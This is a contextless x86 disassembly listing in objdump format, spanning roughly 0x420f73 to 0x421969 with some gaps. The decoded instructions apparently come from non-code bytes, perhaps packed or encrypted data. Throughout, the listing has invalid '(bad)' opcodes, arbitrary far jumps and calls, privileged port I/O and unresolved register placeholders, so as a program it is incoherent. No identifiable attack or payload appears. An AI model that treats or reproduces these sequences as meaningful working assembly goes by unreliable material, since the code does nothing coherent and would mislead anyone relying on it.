  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x5dbb81ec]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	pop    edx
  420f8d:	test   DWORD PTR [ebp+eax*1+0x5e],ecx
  420f91:	mov    esi,0xd8536a26
  420f96:	outs   dx,DWORD PTR ds:[esi]
  420f97:	test   eax,0x8fd993eb
  420f9c:	loope  0x420ff9
  420f9e:	in     eax,0x70
  420fa0:	or     edx,DWORD PTR [eax]
  420fa2:	pop    ebx
  420fa3:	xchg   edx,eax
  420fa4:	sub    DWORD PTR [edx],eax
  420fa6:	mov    ah,0x29
  420fa8:	jne    0x420f38
  420faa:	push   ecx
  420fab:	pop    ecx
  420fac:	iret   
  420fad:	or     ebx,DWORD PTR [edx]
  420faf:	cmp    al,0x72
  420fb1:	lods   al,BYTE PTR ds:[esi]
  420fb2:	scas   eax,DWORD PTR es:[edi]
  420fb3:	iret   
  420fb4:	jns    0x420fb6
  420fb6:	jge    0x420ff9
  420fb8:	dec    edx
  420fb9:	or     eax,0x551fcb77
  420fbe:	fwait
  420fbf:	mov    bh,0x78
  420fc1:	cmp    bl,al
  420fc3:	outs   dx,DWORD PTR ds:[esi]
  420fc4:	imul   ebp,DWORD PTR [edx],0x36
  420fc7:	add    ebx,DWORD PTR [ecx]
  420fc9:	dec    ebp
  420fca:	loope  0x421026
  420fcc:	xor    al,0xbd
  420fce:	cmp    ebp,DWORD PTR [esp+eiz*2-0x13c23b2a]
  420fd5:	add    al,0xa0
  420fd7:	xor    bh,BYTE PTR [ecx]
  420fd9:	mov    ?,WORD PTR [ecx+0x11]
  420fdc:	cmp    BYTE PTR [esi+0x474d2aa3],dh
  420fe2:	dec    edi
  420fe3:	(bad)
  420fe7:	add    bl,bh
  420fe9:	push   ebx
  420fea:	dec    eax
  420feb:	out    0xce,eax
  420fed:	sub    BYTE PTR [ecx],ch
  420fef:	lds    edx,FWORD PTR [eax]
  420ff1:	(bad)  
  420ff2:	iret   
  420ff3:	jb     0x421053
  420ff5:	or     eax,ecx
  420ff7:	dec    edi
  420ff8:	sbb    al,0xd9
  420ffa:	sbb    DWORD PTR [esi+eiz*2+0x43d91c14],ebp
  421001:	fdiv   st,st(2)
  421003:	mov    eax,0x406d6150
  421008:	repnz mov edx,0xb4304226
  42100e:	arpl   WORD PTR [edi-0x10afa43],ax
  421014:	jge    0x420ff9
  421016:	dec    edi
  421017:	shl    BYTE PTR [eax-0x6b],cl
  42101a:	pop    ebx
  42101b:	push   ebp
  42101c:	sbb    ebp,DWORD PTR [eax]
  42101e:	das    
  42101f:	lock or BYTE PTR [edx],ch
  421022:	ret    0x8715
  421025:	aam    0xc2
  421027:	(bad)  
  421028:	adc    al,0x12
  42102a:	add    DWORD PTR [edx+0x7dba1ff2],ebx
  421030:	stos   DWORD PTR es:[edi],eax
  421031:	mov    esp,0x2e07c38b
  421036:	fwait
  421037:	mov    edx,0x41372e02
  42103c:	mov    edi,0x13c5c9d9
  421041:	push   edx
  421042:	ret    
  421043:	ficom  WORD PTR [eax]
  421045:	cmp    BYTE PTR [ecx],bl
  421047:	retf   
  421048:	imul   ecx,DWORD PTR [ebp+0x4e133ec2],0x31334f92
  421052:	push   ebx
  421053:	dec    ebp
  421054:	cli    
  421055:	ret    0x218d
  421058:	jae    0x4210d3
  42105a:	xor    ebx,DWORD PTR [ecx]
  42105c:	xchg   edi,eax
  42105d:	jmp    0xe5b5:0x19d56c7c
  421064:	dec    ecx
  421065:	mov    dh,0x36
  421067:	cs scas eax,DWORD PTR es:[edi]
  421069:	mov    DWORD PTR [edx],edx
  42106b:	gs stos DWORD PTR es:[edi],eax
  42106d:	stos   BYTE PTR es:[edi],al
  42106e:	outs   dx,BYTE PTR ds:[esi]
  42106f:	ret    
  421070:	scas   eax,DWORD PTR es:[edi]
  421071:	hlt    
  421072:	push   0x3e
  421074:	xchg   ecx,eax
  421075:	xchg   esi,eax
  421076:	adc    edi,DWORD PTR [ebx-0x6d]
  421079:	push   eax
  42107a:	fld    TBYTE PTR [ebp-0x533459e2]
  421080:	mov    ecx,DWORD PTR [ecx-0x54]
  421083:	dec    ecx
  421084:	test   DWORD PTR [edx],ebp
  421086:	hlt    
  421087:	inc    edx
  421088:	outs   dx,BYTE PTR ds:[esi]
  421089:	dec    edx
  42108a:	mov    ss,WORD PTR [edx-0x40]
  42108d:	push   esi
  42108e:	push   0x35
	...
  4210f4:	lahf   
  4210f5:	pop    esi
  4210f6:	fcmovb st,st(6)
  4210f8:	fcmovnb st,st(6)
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    cs,WORD PTR [esp+eax*2+0x600cc681]
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	jmp    0x4986:0x622380a5
  421113:	popf   
  421114:	lods   al,BYTE PTR ds:[esi]
  421115:	rcr    DWORD PTR [edi-0x7d],0x40
  421119:	xchg   ebx,eax
  42111a:	jmp    0x3321:0x240d4cf2
  421121:	jl     0x4210fb
  421123:	std    
  421124:	sbb    DWORD PTR [esi-0x1d1dc9f6],0x94609828
  42112e:	inc    ebp
  42112f:	mov    ?,WORD PTR [ecx+ecx*1+0x6dc6ea09]
  421136:	or     DWORD PTR ds:0xf4861db7,ebx
  42113c:	inc    edx
  42113d:	hlt    
  42113e:	jle    0x42116f
  421140:	dec    edx
  421141:	add    eax,0x815d48c4
  421146:	sbb    BYTE PTR [ebx-0x8a490f8],ch
  42114c:	dec    ebp
  42114d:	stc    
  42114e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42114f:	pop    ecx
  421150:	ins    DWORD PTR es:[edi],dx
  421151:	bnd call 0x3bb45765
  421157:	pop    ds
  421158:	fisub  WORD PTR [edx-0x3]
  42115b:	fistp  DWORD PTR [esi+0x5fdb6691]
  421161:	(bad)  
  421162:	pop    ds
  421163:	les    ebx,FWORD PTR [ebx]
  421165:	in     al,0x55
  421167:	pop    es
  421168:	dec    edi
  421169:	mov    eax,ds:0xfca91e59
  42116e:	cli    
  42116f:	mov    BYTE PTR [ebx+0x34],0x65
  421173:	out    dx,eax
  421174:	pop    edx
  421175:	imul   ecx,DWORD PTR ds:0xa6855179,0xffffffdb
  42117c:	sbb    al,0xdc
  42117e:	dec    eax
  42117f:	inc    esp
  421180:	mov    al,ds:0xd0f0e3fa
  421185:	xchg   ebx,eax
  421186:	mov    bh,BYTE PTR ds:0x5e9f6346
  42118c:	add    DWORD PTR [eax],edi
  42118e:	push   esi
  42118f:	fwait
  421190:	(bad)  
  421191:	fstp   QWORD PTR [eax+0x31]
  421194:	pop    esi
  421195:	mov    esi,DWORD PTR [ecx-0xd1c769c]
  42119b:	call   0xeeb4:0x35ba732
  4211a2:	mov    ebp,0x6ec511b
  4211a7:	jg     0x4211e7
  4211a9:	daa    
  4211aa:	dec    ebx
  4211ab:	fdiv   QWORD PTR [edx]
  4211ad:	(bad)  
  4211ae:	out    dx,al
  4211af:	adc    esi,DWORD PTR [eax+0x719815e4]
  4211b5:	inc    edx
  4211b6:	xor    BYTE PTR [esi],dl
  4211b8:	and    ax,0x4361
  4211bc:	and    ch,BYTE PTR [ecx+0x62]
  4211bf:	scas   al,BYTE PTR es:[edi]
  4211c0:	dec    eax
  4211c1:	popf   
  4211c2:	push   esi
  4211c3:	xor    dh,0xec
  4211c6:	imul   edi,edi,0xcbe27124
  4211cc:	cmp    esi,edx
  4211ce:	dec    esi
  4211cf:	jnp    0x421194
  4211d1:	aad    0x75
  4211d3:	clc    
  4211d4:	pop    edx
  4211d5:	inc    esp
  4211d6:	pop    ds
  4211d7:	adc    eax,0x3414eec3
  4211dc:	js     0x421189
  4211de:	or     BYTE PTR [esi-0x32],cl
  4211e1:	pop    ebx
  4211e2:	imul   esp,DWORD PTR [esi+0x16],0x2
  4211e6:	mov    dh,0x8e
  4211e8:	addr16 cld 
  4211ea:	jbe    0x421182
  4211ec:	out    dx,al
  4211ed:	iret   
  4211ee:	dec    ebp
  4211ef:	leave  
  4211f0:	lds    eax,FWORD PTR [eax-0x6e]
  4211f3:	int    0xbd
  4211f5:	sbb    BYTE PTR [esi+0x77],0x3b
  4211f9:	pop    ds
  4211fa:	push   ecx
  4211fb:	mov    edx,0xacdc644b
  421200:	sbb    ah,BYTE PTR [ecx-0x41fb16e9]
  421206:	inc    esp
  421207:	leave  
  421208:	out    0x32,eax
  42120a:	sub    esi,esp
  42120c:	call   0x636ab0
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0x93e37ab3
  421282:	push   eax
  421283:	fist   WORD PTR [eax]
  421285:	popa   
  421286:	add    DWORD PTR [eax],eax
  421288:	add    al,0x1
  42128a:	add    BYTE PTR [eax],al
  42128c:	jecxz  0x421255
  42128e:	aad    0x2d
  421290:	pop    edi
  421291:	int3   
  421292:	xor    eax,0xa948480e
  421297:	std    
  421298:	fs (bad) 
  42129a:	jns    0x421250
  42129c:	lahf   
  42129d:	pop    ss
  42129e:	mov    ah,0x60
  4212a0:	jp     0x42128a
  4212a2:	ss test eax,0x714bfdee
  4212a8:	inc    ecx
  4212a9:	mov    al,ds:0x5da2006d
  4212ae:	xchg   esp,eax
  4212af:	xor    edi,DWORD PTR cs:[ebp+0x1e42a492]
  4212b6:	(bad)  
  4212b7:	(bad)  
  4212b9:	and    esp,DWORD PTR [esi]
  4212bb:	je     0x421322
  4212bd:	bswap  ecx
  4212bf:	call   DWORD PTR [ebx]
  4212c1:	out    dx,al
  4212c2:	(bad)  [ecx]
  4212c4:	retf   0x1663
  4212c7:	adc    al,0xe3
  4212c9:	sub    eax,esi
  4212cb:	mov    al,ds:0x626b68f8
  4212d0:	rol    BYTE PTR [eax-0x731171f5],cl
  4212d6:	loope  0x4212d4
  4212d8:	shl    dl,1
  4212da:	mov    ecx,0x848eeb40
  4212df:	rcr    BYTE PTR [edx],0x13
  4212e2:	dec    esi
  4212e3:	jl     0x4212b6
  4212e5:	test   eax,0x313f030d
  4212ea:	push   0x9ed13267
  4212ef:	mov    ecx,0xe47b50b3
  4212f4:	and    ecx,DWORD PTR [edi+0x7959799d]
  4212fa:	jne    0x4212ad
  4212fc:	sub    DWORD PTR [edx],edi
  4212fe:	xchg   ecx,eax
  4212ff:	mov    esp,0x1ac57d25
  421304:	std    
  421305:	ret    
  421306:	(bad)  [eax]
  421308:	sbb    cl,bh
  42130a:	std    
  42130b:	and    eax,0x3db4ee25
  421310:	sub    BYTE PTR [edi+0x77051aa1],dh
  421316:	lods   al,BYTE PTR ds:[esi]
  421317:	mov    ch,0xd4
  421319:	mov    al,ds:0x8e8bf21e
  42131e:	(bad)  [ebp-0x26]
  421321:	dec    esi
  421322:	sub    bh,BYTE PTR [eax+esi*4]
  421325:	out    dx,eax
  421326:	sbb    cl,cl
  421328:	add    ch,BYTE PTR [edi-0x1cab9ede]
  42132e:	inc    ebp
  42132f:	int3   
  421330:	push   eax
  421331:	xchg   BYTE PTR [esi+0x1c],al
  421334:	or     edi,DWORD PTR [ebp-0x36fa864e]
  42133a:	or     edi,DWORD PTR [bp+di-0x60]
  42133e:	nop
  42133f:	mov    es,WORD PTR [ebp+ebx*1-0x4d775128]
  421346:	mov    cl,0x34
  421348:	or     BYTE PTR [ecx-0x5],dl
  42134b:	ins    DWORD PTR es:[edi],dx
  42134c:	(bad)  [edx+edi*4-0x7d]
  421350:	loop   0x421322
  421352:	iret   
  421353:	test   al,dl
  421355:	fbld   TBYTE PTR [ecx-0x79b24382]
  42135b:	xchg   BYTE PTR [ebx-0x43],cl
  42135e:	or     dh,ah
  421360:	mov    esp,0x5b1accee
  421365:	and    al,BYTE PTR [ebx-0x59]
  421368:	dec    ebp
  421369:	lds    edx,FWORD PTR [esi-0x1fc218fd]
  42136f:	and    bl,BYTE PTR [ecx-0x6f97afea]
  421375:	enter  0x75cf,0xd
  421379:	iret   
  42137a:	daa    
  42137b:	xor    cl,cl
  42137d:	pop    ecx
  42137e:	call   0xd1ae:0x7e14b0c0
  421385:	not    BYTE PTR [ecx+0x24bbada1]
  42138b:	push   edi
  42138c:	popa   
  42138d:	inc    ecx
  42138e:	push   ebx
  42138f:	inc    ebx
	...
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x59250b61]
  421402:	mov    al,0x14
  421404:	adc    al,0x62
  421406:	add    DWORD PTR [eax],eax
  421408:	add    al,0x1
  42140a:	add    BYTE PTR [eax],al
  42140c:	cmp    ah,dl
  42140e:	push   cs
  42140f:	les    ecx,FWORD PTR [eax-0x61]
  421412:	sub    ch,BYTE PTR [ebp+0x1c356795]
  421418:	cmp    ebp,DWORD PTR [esi+0x37b06202]
  42141e:	mov    cl,0x84
  421420:	inc    ecx
  421421:	lods   al,BYTE PTR ds:[esi]
  421422:	sub    bh,bl
  421424:	adc    BYTE PTR [ebx],bh
  421426:	dec    ebp
  421427:	ins    BYTE PTR es:[edi],dx
  421428:	pop    es
  421429:	mov    WORD PTR [ebx-0x43],es
  42142c:	mov    ah,0xf2
  42142e:	add    al,0xe8
  421430:	inc    esi
  421431:	cmc    
  421432:	sub    al,0x17
  421434:	pop    esp
  421435:	fist   DWORD PTR [edx]
  421437:	mov    al,ds:0x36f7381c
  42143c:	rcr    BYTE PTR [eax-0x34f12772],0x17
  421443:	push   ebp
  421444:	test   al,0x36
  421446:	adc    ch,ah
  421448:	out    dx,ax
  42144a:	cmp    al,0x66
  42144c:	jo     0x4213e2
  42144e:	mov    bl,0x67
  421450:	mov    cl,bh
  421452:	pop    eax
  421453:	enter  0x8eed,0x73
  421457:	lds    ecx,FWORD PTR ds:0x7d244518
  42145d:	add    BYTE PTR [ebp-0x45cf8cd2],cl
  421463:	or     dh,dh
  421465:	xchg   edx,eax
  421466:	call   0xa8fc:0x6da442bc
  42146d:	xchg   edx,eax
  42146e:	pop    ecx
  42146f:	mov    dh,0xd0
  421471:	and    eax,0xdb827ceb
  421476:	mov    ds,WORD PTR [edi+0x5d1d77ce]
  42147c:	jmp    0x3b9b:0xb1ed381b
  421483:	jns    0x421486
  421485:	iret   
  421486:	retf   
  421487:	mov    ch,0xe
  421489:	lock call 0x2bb7:0xade6a2d8
  421491:	fdivr  st,st(6)
  421493:	mov    edx,0x4cab887a
  421498:	sub    bl,BYTE PTR [ebx-0x52]
  42149b:	add    DWORD PTR [ebp-0x46],edi
  42149e:	or     al,0x3a
  4214a0:	dec    esi
  4214a1:	sub    al,0x69
  4214a3:	aam    0xc4
  4214a5:	fiadd  WORD PTR [eax]
  4214a7:	dec    ebx
  4214a8:	push   ss
  4214a9:	xor    eax,0xde272014
  4214ae:	jns    0x4214a2
  4214b0:	aaa    
  4214b1:	cli    
  4214b2:	sub    ebp,DWORD PTR [ecx]
  4214b4:	or     BYTE PTR [ecx-0x69bd263],bh
  4214ba:	popf   
  4214bb:	pop    ds
  4214bc:	xlat   BYTE PTR ds:[ebx]
  4214bd:	or     ecx,DWORD PTR [edi]
  4214bf:	pop    ss
  4214c0:	div    eax
  4214c2:	mov    al,0xc0
  4214c4:	xlat   BYTE PTR ds:[ebx]
  4214c5:	std    
  4214c6:	stos   DWORD PTR es:[edi],eax
  4214c7:	xor    al,0x73
  4214c9:	mov    cl,0x22
  4214cb:	fistp  DWORD PTR [esi-0x3a]
  4214ce:	xchg   edi,eax
  4214cf:	sahf   
  4214d0:	fadd   QWORD PTR [esi-0x6782f734]
  4214d6:	inc    eax
  4214d7:	jmp    0x421543
  4214d9:	xchg   ebp,eax
  4214da:	adc    BYTE PTR [ebx],ch
  4214dc:	loop   0x42146c
  4214de:	je     0x4214cf
  4214e0:	popa   
  4214e1:	mov    dl,0xac
  4214e3:	ja     0x4214e8
  4214e5:	hlt    
  4214e6:	or     eax,0x9151235c
  4214eb:	cmp    BYTE PTR [ecx],0x1b
  4214ee:	adc    BYTE PTR [ebp-0x4587ce41],al
  4214f4:	add    eax,DWORD PTR [eax+0xbbac8ca]
  4214fa:	jno    0x4214e2
  4214fc:	cmp    al,BYTE PTR [ecx]
  4214fe:	ins    BYTE PTR es:[edi],dx
  4214ff:	outs   dx,DWORD PTR ds:[esi]
  421500:	adc    BYTE PTR [esi+0x219b3d69],dh
  421506:	pop    esi
  421507:	cs add eax,0x9322b807
  42150d:	sbb    eax,ecx
  42150f:	jmp    0x0:0x0
	...
  421572:	add    BYTE PTR [eax],al
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x29b0bd4c],bp
  421582:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  421584:	sbb    BYTE PTR [ebx+0x1],ah
  421587:	add    BYTE PTR [ecx+eax*1],al
  42158a:	add    BYTE PTR [eax],al
  42158c:	inc    ebx
  42158d:	or     bh,ah
  42158f:	loopne 0x4215e2
  421591:	xchg   ebx,eax
  421592:	rcr    BYTE PTR [esi+eax*8-0x36],cl
  421596:	iret   
  421597:	fcomp  DWORD PTR [esi]
  421599:	mov    edx,0x20773333
  42159e:	inc    ebp
  42159f:	jo     0x4215e1
  4215a1:	cmp    esi,DWORD PTR [ecx+ebp*8]
  4215a4:	test   eax,0xd0e9bc75
  4215a9:	cmc    
  4215aa:	inc    ecx
  4215ab:	adc    cl,BYTE PTR [ecx+0x73]
  4215ae:	std    
  4215af:	mov    dh,0x86
  4215b1:	mov    fs,WORD PTR [eax+0x164d9c55]
  4215b7:	ds jo  0x4215d6
  4215ba:	or     BYTE PTR [eax-0x11],bh
  4215bd:	xchg   ebp,eax
  4215be:	cmp    bl,bh
  4215c0:	lods   al,BYTE PTR ds:[esi]
  4215c1:	and    BYTE PTR ds:0xa242c2c1,ch
  4215c7:	out    dx,eax
  4215c8:	jge    0x42161c
  4215ca:	jo     0x4215a9
  4215cc:	aas    
  4215cd:	retf   
  4215ce:	out    0x37,al
  4215d0:	jg     0x4215d6
  4215d2:	adc    al,BYTE PTR [ebx+ebx*1-0x121e4e97]
  4215d9:	ret    0xd265
  4215dc:	push   ds
  4215dd:	or     DWORD PTR [ebx+0x24560150],eax
  4215e3:	and    DWORD PTR [ebx],ebx
  4215e5:	into   
  4215e6:	repz xchg ecx,eax
  4215e8:	xor    dl,cl
  4215ea:	xor    dl,dl
  4215ec:	in     eax,0xb4
  4215ee:	ficom  DWORD PTR [edi-0x235fa532]
  4215f4:	mov    ds:0xa53b3ed5,al
  4215f9:	out    0x83,eax
  4215fb:	loope  0x421644
  4215fd:	push   ds
  4215fe:	mov    ds:0x5cd0f7a1,eax
  421603:	xchg   edx,eax
  421604:	mov    ds:0x342f248b,al
  421609:	dec    ecx
  42160a:	xor    edx,DWORD PTR [ebx+0x63]
  42160d:	mov    bh,0xc5
  42160f:	out    dx,al
  421610:	xor    ch,BYTE PTR [ebx+eiz*8-0x2eb94bff]
  421617:	or     bl,ch
  421619:	(bad)  
  42161b:	push   ds
  42161c:	pop    ebx
  42161d:	jecxz  0x4215b6
  42161f:	retf   
  421620:	mov    bl,0xc6
  421622:	mov    bh,0x4c
  421624:	inc    ebx
  421625:	sbb    al,0x91
  421627:	cs shr dl,1
  42162a:	(bad)  
  42162b:	out    dx,al
  42162c:	call   DWORD PTR [ecx+eiz*8]
  42162f:	sahf   
  421630:	xor    dh,BYTE PTR [eax-0x94bf8a4]
  421636:	gs data16 aam 0x9c
  42163a:	or     DWORD PTR [edi],edi
  42163c:	pop    edx
  42163d:	leave  
  42163e:	repnz lock pop es
  421641:	sar    BYTE PTR [edi],1
  421643:	xchg   edx,eax
  421644:	dec    ebx
  421645:	idiv   bl
  421647:	xchg   ebx,edx
  421649:	loope  0x421606
  42164b:	jge    0x421625
  42164d:	push   eax
  42164e:	add    bl,BYTE PTR [ecx-0x49]
  421651:	dec    esi
  421652:	fld    TBYTE PTR [edx-0x26]
  421655:	mov    edi,0x9c66f903
  42165a:	jge    0x421675
  42165c:	xchg   esi,eax
  42165d:	ins    BYTE PTR es:[edi],dx
  42165e:	dec    eax
  42165f:	fist   WORD PTR [edi]
  421661:	int3   
  421662:	pop    ds
  421663:	mov    dl,0xce
  421665:	sub    bh,BYTE PTR [edx+ebp*8+0x2ba3911b]
  42166c:	lahf   
  42166d:	iret   
  42166e:	jae    0x421660
  421670:	rcl    eax,cl
  421672:	jne    0x421614
  421674:	sar    BYTE PTR ds:[eax-0x25270b95],cl
  42167b:	icebp  
  42167c:	mov    ebx,0xccb87c00
  421681:	das    
  421682:	mov    cl,0xd
  421684:	dec    edi
  421685:	pop    ss
  421686:	push   ebp
  421687:	in     eax,dx
  421688:	out    dx,al
  421689:	jecxz  0x42165c
  42168b:	fdivr  QWORD PTR [edi]
  42168d:	pop    esi
  42168e:	cmp    BYTE PTR [ecx+0x0],dh
	...
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	inc    ecx
  421701:	push   eax
  421702:	mov    eax,0x1641cd6
  421707:	add    BYTE PTR [ecx+eax*1],al
  42170a:	add    BYTE PTR [eax],al
  42170c:	jae    0x4216f2
  42170e:	bnd jmp 0x511aa5ff
  421714:	cmp    al,cl
  421716:	fs push es
  421718:	scas   eax,DWORD PTR es:[edi]
  421719:	and    al,0x75
  42171b:	mov    ds:0x25a11b03,al
  421720:	icebp  
  421721:	push   ebx
  421722:	push   eax
  421723:	clc    
  421724:	xor    esp,DWORD PTR [esi-0x7f89318d]
  42172a:	and    eax,0x63ddc158
  42172f:	push   es
  421730:	or     edi,DWORD PTR [esi]
  421732:	js     0x421725
  421734:	and    edi,DWORD PTR [ebx+ebx*1-0x30330e8e]
  42173b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42173d:	jmp    0xe64ced60
  421742:	call   0x873c:0x65a88f02
  421749:	cmp    eax,eax
  42174b:	fwait
  42174c:	lea    ebp,[edi]
  42174e:	stc    
  42174f:	mov    bh,0x43
  421751:	shl    BYTE PTR [ecx],1
  421753:	jnp    0x42174e
  421755:	xchg   edi,eax
  421756:	sub    al,0x90
  421758:	mov    ds:0xc4d6a98f,al
  42175d:	stos   DWORD PTR es:[edi],eax
  42175e:	std    
  42175f:	cmp    dh,BYTE PTR [edx-0x53780e8]
  421765:	rcl    dl,0x11
  421768:	dec    ebx
  421769:	dec    eax
  42176a:	out    dx,eax
  42176b:	push   ebp
  42176c:	pushf  
  42176d:	aas    
  42176e:	or     cl,0x3e
  421771:	arpl   WORD PTR [esi],bx
  421773:	ja     0x421757
  421775:	xor    bh,ch
  421777:	(bad)  
  421778:	cmp    eax,0x34a52372
  42177d:	aas    
  42177e:	xlat   BYTE PTR ds:[ebx]
  42177f:	dec    ecx
  421780:	push   0x78
  421782:	dec    ebp
  421783:	aaa    
  421784:	fstp   st(1)
  421786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421787:	test   BYTE PTR [ecx],al
  421789:	adc    DWORD PTR [eax-0x24],esi
  42178c:	add    bl,ah
  42178e:	inc    esp
  42178f:	scas   eax,DWORD PTR es:[edi]
  421790:	retf   
  421791:	popa   
  421792:	mov    bl,0x95
  421794:	or     esp,DWORD PTR [esi+0x3d49859b]
  42179a:	dec    ecx
  42179b:	fiadd  DWORD PTR cs:[esi]
  42179e:	ins    DWORD PTR es:[edi],dx
  42179f:	lock push ebx
  4217a1:	(bad)  
  4217a2:	ins    BYTE PTR es:[edi],dx
  4217a3:	push   ds
  4217a4:	or     esi,DWORD PTR [ebx]
  4217a6:	and    DWORD PTR [ecx],ebp
  4217a8:	gs (bad) 
  4217aa:	aad    0x54
  4217ac:	or     dh,dh
  4217ae:	arpl   bp,bx
  4217b0:	mov    edx,0x2991b41a
  4217b5:	retf   0xf2f1
  4217b8:	ja     0x421806
  4217ba:	or     eax,esi
  4217bc:	fwait
  4217bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217be:	fbstp  TBYTE PTR [ebx-0x57126a90]
  4217c4:	inc    edi
  4217c5:	push   0xffffffc5
  4217c7:	xchg   esp,eax
  4217c8:	mov    ebx,0xa3418bd2
  4217cd:	add    dh,bl
  4217cf:	pop    eax
  4217d0:	in     al,0x8d
  4217d2:	inc    eax
  4217d3:	mov    dl,0xb1
  4217d5:	push   cs
  4217d6:	or     eax,0x7cfbe698
  4217db:	test   BYTE PTR [esi],0x3d
  4217de:	shl    BYTE PTR [esi-0x36e2cbe3],cl
  4217e4:	jecxz  0x4217a2
  4217e6:	dec    eax
  4217e7:	add    BYTE PTR [edi],bh
  4217e9:	jb     0x421815
  4217eb:	imul   esi,DWORD PTR [edi],0xcadedb33
  4217f1:	(bad)  
  4217f2:	ror    edi,1
  4217f4:	sub    ebx,eax
  4217f6:	add    eax,0xffffff96
  4217f9:	fcomp  QWORD PTR [ebx+0x35]
  4217fc:	mov    edx,0x185dcd7a
  421801:	inc    esp
  421802:	mov    ds:0xee81927,eax
  421807:	mov    dl,BYTE PTR [eax-0x57]
  42180a:	nop
  42180b:	hlt    
  42180c:	mov    bh,0x0
  42180e:	push   esp
  42180f:	in     eax,0x0
	...
  421871:	add    BYTE PTR [eax],al
  421873:	add    cl,dl
  421875:	mov    al,ds:0xf9f9e0b9
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	daa    
  421881:	int    0xcf
  421883:	shl    DWORD PTR [eax],cl
  421885:	add    DWORD PTR gs:[eax],eax
  421888:	add    al,0x1
  42188a:	add    BYTE PTR [eax],al
  42188c:	inc    ebp
  42188d:	mov    cl,0xce
  42188f:	push   cs
  421890:	out    0x6f,eax
  421892:	jo     0x42185c
  421894:	(bad)  
  421895:	pop    ds
  421896:	adc    cl,bl
  421898:	push   eax
  421899:	xchg   BYTE PTR [ecx+0x64],al
  42189c:	jns    0x42187e
  42189e:	les    ecx,FWORD PTR [edi]
  4218a0:	sbb    eax,0xb8f0b1ba
  4218a5:	sbb    BYTE PTR [eax-0x6e],0x60
  4218a9:	mov    dl,BYTE PTR [eax+ebp*4]
  4218ac:	dec    edx
  4218ad:	xchg   ebp,eax
  4218ae:	jg     0x421909
  4218b0:	retf   0xde54
  4218b3:	leave  
  4218b4:	icebp  
  4218b5:	aas    
  4218b6:	mov    cs,ebx
  4218b8:	sahf   
  4218b9:	add    eax,0x4f92a4dc
  4218be:	jno    0x421888
  4218c0:	add    DWORD PTR [esi-0x2f857d77],0xffffffad
  4218c7:	push   esi
  4218c8:	sbb    bh,BYTE PTR [ecx+0x50]
  4218cb:	out    0xe2,al
  4218cd:	(bad)  
  4218cf:	aas    
  4218d0:	pop    ss
  4218d1:	retf   
  4218d2:	ret    
  4218d3:	xchg   edi,eax
  4218d4:	add    al,0x6e
  4218d6:	and    BYTE PTR [esi+0x64a6cd18],0x9b
  4218dd:	inc    edi
  4218de:	adc    al,0x4a
  4218e0:	jg     0x421930
  4218e2:	push   es
  4218e3:	rol    eax,1
  4218e5:	xor    DWORD PTR [eax+0x5e],ecx
  4218e8:	sub    al,0x10
  4218ea:	xchg   ebx,eax
  4218eb:	mov    WORD PTR [edx],?
  4218ed:	in     eax,dx
  4218ee:	sbb    bl,BYTE PTR [edi]
  4218f0:	pop    eax
  4218f1:	popf   
  4218f2:	jl     0x4218bd
  4218f4:	jg     0x421969
  4218f6:	jnp    0x421958
  4218f8:	lds    esp,FWORD PTR [ebx+0x7c]
  4218fb:	inc    edi
  4218fc:	jle    0x421927
  4218fe:	inc    edi
  4218ff:	sbb    BYTE PTR [eax],0x97
  421902:	fdivr  st,st(2)
  421904:	gs (bad) 
  421906:	out    dx,al
  421907:	push   eax
  421908:	in     al,0xf3
  42190a:	fdivr  DWORD PTR [eax-0x1f96c861]
  421910:	mov    ebx,0x5b1f9574
  421915:	xor    al,0xf0
  421917:	lock xchg esi,eax
  421919:	loope  0x4218f3
  42191b:	jmp    DWORD PTR [ecx-0x707dc8e9]
  421921:	inc    ebp
  421922:	test   eax,0x31135c38
  421927:	in     eax,0xbb
  421929:	ins    BYTE PTR es:[edi],dx
  42192a:	jmp    0xe9b0:0xa0995388
  421931:	leave  
  421932:	imul   esi,ebx,0xee52921a
  421938:	xchg   edi,eax
  421939:	popf   
  42193a:	stc    
  42193b:	outs   dx,BYTE PTR ds:[esi]
  42193c:	popa   
  42193d:	inc    edi
  42193e:	jecxz  0x421903
  421940:	cmp    al,BYTE PTR [esi]
  421942:	or     al,BYTE PTR [ecx+0x14]
  421945:	sub    al,0xc
  421947:	or     ah,ah
  421949:	ja     0x421996
  42194b:	in     al,0xaf
  42194d:	cmp    eax,0x2231ee39
  421952:	outs   dx,DWORD PTR ds:[esi]
  421953:	push   es
  421954:	xor    bh,BYTE PTR gs:[esi-0x3cb59d60]
  42195b:	xchg   edx,eax
  42195c:	add    al,BYTE PTR [edx]
  42195e:	icebp  
  42195f:	mov    al,ds:0xff3007e1
  421964:	cmp    eax,0x12f4965a
  421969:	cmc    
